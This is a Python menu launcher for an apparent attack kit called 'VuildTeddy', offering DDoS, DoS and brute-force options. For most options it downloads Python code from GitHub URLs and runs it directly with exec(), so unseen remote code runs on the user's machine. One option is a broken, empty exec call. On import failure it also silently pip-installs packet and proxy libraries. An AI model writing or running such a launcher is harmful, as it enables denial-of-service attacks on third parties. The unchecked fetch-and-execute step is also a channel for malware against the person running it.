import sys
import time
from time import sleep, strftime
from datetime import datetime
import threading
import webbrowser, os, re, json, random
import msvcrt
import subprocess
import ctypes
try:
    from faker import Faker
    from requests import session
    from colorama import Fore, Style
    import requests, random, re
    from random import choice, randint, shuffle
    import requests, pystyle
    from pystyle import Write, Colors
    import subprocess
    import ctypes
except ImportError:
    os.system("pip install humanfriendly && pip install PySocks")
    os.system("pip install scapy && pip install get_mac")
    os.system("pip install faker && pip install ctypes")
    os.system("pip install requests")
    os.system("pip install colorama && pip install subprocess")
    os.system('pip install requests && pip install bs4 && pip install pystyle && pip install pycryptodome')
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System

def windowtitle(a):
    os.system(f"title {a}")

windowtitle("VuildTeddy Main")
os.system('cls')

banner = f"""
 
              
                               Contact Discord vuldteddy_ to reset/change password!

                                     _   __     _ __   ________       __   __    
                                    | | / /_ __(_) /__/ /_  __/__ ___/ /__/ /_ __
                                    | |/ / // / / / _  / / / / -_) _  / _  / // /
                                    |___/\_,_/_/_/\_,_/ /_/  \__/\_,_/\_,_/\_, / 
                                                                          /___/ 
                                                    [N]Source
                               
                            1.DDoS                                            2.DoS
                                                           
                                                         
                                                3.BrutedForce



     
       
"""
print(banner)
while True:
    os.system('cls')
    print(banner)
    select = Write.Input("           = >>  ", Colors.cyan_to_blue, interval=0.0010)
    if select == '1':
        os.system('cls')
        exec(requests.get('https://raw.githubusercontent.com/AprillZerx/Loin/main/ddos').text)
    elif select == '2':
        os.system('cls')
        exec(requests.get('https://raw.githubusercontent.com/AprillZerx/Loin/main/dos').text)
    elif select == '3':
        os.system('cls')
        exec
    elif select == 'N':
        os.system('cls')
        exec(requests.get('https://raw.githubusercontent.com/AprillZerx/Loin/main/source').text)
    else:
        continue
